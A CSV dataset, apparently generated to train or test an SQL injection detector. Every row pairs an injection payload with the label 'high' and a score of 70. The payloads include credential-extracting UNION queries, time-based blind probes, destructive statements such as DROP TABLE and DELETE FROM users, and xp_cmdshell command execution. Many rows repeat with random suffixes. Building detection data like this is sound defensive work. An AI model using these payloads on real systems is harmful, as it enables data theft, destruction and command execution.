query,risk,score
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 6,high,70
' OR SLEEP(5) AND '1'='1 # 6,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; DROP PROCEDURE admin_login-- # p,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # x,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # b,high,70
' OR 1=1; DROP TABLE temp; -- # f,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # k,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # v",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 0",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 0",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 7,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # l,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; DROP PROCEDURE admin_login-- # h,high,70
'; DROP PROCEDURE admin_login-- # w,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; WAITFOR DELAY '0:0:5'-- # c,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # k",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 5,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # q",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # t",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; DELETE FROM users; /**/ # s,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 0",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 5",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # v,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # i,high,70
'; DELETE FROM users; /**/ # v,high,70
' OR SLEEP(5) AND '1'='1 # k,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 6",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
' OR 1=1; DROP TABLE temp; -- # 6,high,70
'; SELECT pg_sleep(5); -- # 8,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR 1=1; DROP TABLE temp; -- # 1,high,70
' OR 1=1; DROP TABLE temp; -- # s,high,70
'; DROP PROCEDURE admin_login-- # 6,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # n,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 3",high,70
'; WAITFOR DELAY '0:0:5'-- # 6,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
' OR 1=1; DROP TABLE temp; -- # 7,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 9,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' UNION ALL SELECT username, password FROM users # h",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; DROP PROCEDURE admin_login-- # x,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # g,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 2",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' UNION ALL SELECT username, password FROM users # v",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 4",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
' OR SLEEP(5) AND '1'='1 # k,high,70
'; DELETE FROM users; /**/ # w,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; DROP PROCEDURE admin_login-- # 5,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # f",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 3,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # n,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # k",high,70
"' UNION ALL SELECT username, password FROM users # 3",high,70
"' UNION ALL SELECT username, password FROM users # 1",high,70
'; SELECT pg_sleep(5); -- # 6,high,70
'; DELETE FROM users; /**/ -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # q,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 7,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # t,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # o",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # t,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # l",high,70
'; DELETE FROM users; /**/ -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 1,high,70
'; DELETE FROM users; /**/ # u,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # v,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 8,high,70
' OR 1=1; DROP TABLE temp; -- # y,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # x,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # a,high,70
'; WAITFOR DELAY '0:0:5'-- # 0,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # j",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # x",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # d,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # z,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # o",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # i",high,70
'; SELECT pg_sleep(5); -- # r,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # q,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # s",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # 8,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # i,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; DELETE FROM users; /**/ # 3,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # o,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # c,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DROP PROCEDURE admin_login-- # y,high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR SLEEP(5) AND '1'='1 # s,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # k,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # j,high,70
' OR SLEEP(5) AND '1'='1 # 7,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # d,high,70
'; DROP PROCEDURE admin_login-- # h,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
' OR SLEEP(5) AND '1'='1 # 3,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # w,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # q",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DELETE FROM users; /**/ # 8,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # y,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 3,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; DROP PROCEDURE admin_login-- # 2,high,70
' OR SLEEP(5) AND '1'='1 # z,high,70
'; DROP PROCEDURE admin_login-- # r,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DELETE FROM users; /**/ # 7,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; DELETE FROM users; /**/ # 0,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 8",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 0,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DROP PROCEDURE admin_login-- # b,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 9,high,70
' OR SLEEP(5) AND '1'='1 # b,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # q",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 4,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # g",high,70
'; DROP PROCEDURE admin_login-- # k,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # l",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"' UNION ALL SELECT username, password FROM users # j",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # c",high,70
"' UNION ALL SELECT username, password FROM users # 6",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 0,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # e,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # m",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # q",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # z",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # w,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # r,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR 1=1; DROP TABLE temp; -- # o,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # s",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # j",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; DELETE FROM users; /**/ # r,high,70
' OR SLEEP(5) AND '1'='1 # s,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # w",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 6,high,70
"' UNION ALL SELECT username, password FROM users # r",high,70
'; SELECT pg_sleep(5); -- # 6,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # a,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # k,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # w,high,70
'; DELETE FROM users; /**/ # s,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 8,high,70
' OR 1=1; DROP TABLE temp; -- # c,high,70
'; DELETE FROM users; /**/ # w,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # s",high,70
'; DROP PROCEDURE admin_login-- # 7,high,70
' OR SLEEP(5) AND '1'='1 # b,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 2,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # g,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DROP PROCEDURE admin_login-- # l,high,70
' OR 1=1; DROP TABLE temp; -- # h,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # b,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 3",high,70
"' UNION ALL SELECT username, password FROM users # s",high,70
' OR 1=1; DROP TABLE temp; -- # i,high,70
'; DROP PROCEDURE admin_login-- # o,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"' UNION ALL SELECT username, password FROM users # q",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; DELETE FROM users; /**/ # 3,high,70
' OR 1=1; DROP TABLE temp; -- # a,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 0,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 0,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # p",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"' UNION ALL SELECT username, password FROM users # k",high,70
'; DELETE FROM users; /**/ -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DELETE FROM users; /**/ # k,high,70
"' UNION ALL SELECT username, password FROM users # g",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR 1=1; DROP TABLE temp; -- # u,high,70
'; SELECT pg_sleep(5); -- # t,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # q,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DROP PROCEDURE admin_login-- # p,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DROP PROCEDURE admin_login-- # 8,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # e",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # e,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; DROP PROCEDURE admin_login-- # 3,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' UNION ALL SELECT username, password FROM users # z",high,70
'; DROP PROCEDURE admin_login-- # p,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # a,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 8",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 6",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 7,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # a,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 8,high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR SLEEP(5) AND '1'='1 # l,high,70
'; DROP PROCEDURE admin_login-- # u,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 2,high,70
'; DELETE FROM users; /**/ -- ,high,70
'; SELECT pg_sleep(5); -- # h,high,70
'; DELETE FROM users; /**/ -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 0,high,70
' OR 1=1; DROP TABLE temp; -- # o,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # a",high,70
'; DELETE FROM users; /**/ # r,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # y,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # v,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 5,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # r",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # d,high,70
'; WAITFOR DELAY '0:0:5'-- # 9,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 0,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; DROP PROCEDURE admin_login-- # j,high,70
"' UNION ALL SELECT username, password FROM users # i",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # s,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # n,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # u",high,70
'; WAITFOR DELAY '0:0:5'-- # f,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # v",high,70
'; DELETE FROM users; /**/ # v,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # c",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # k",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; SELECT pg_sleep(5); -- # n,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # m",high,70
'; SELECT pg_sleep(5); -- # 5,high,70
' OR SLEEP(5) AND '1'='1 # z,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; SELECT pg_sleep(5); -- # g,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # w,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # l,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
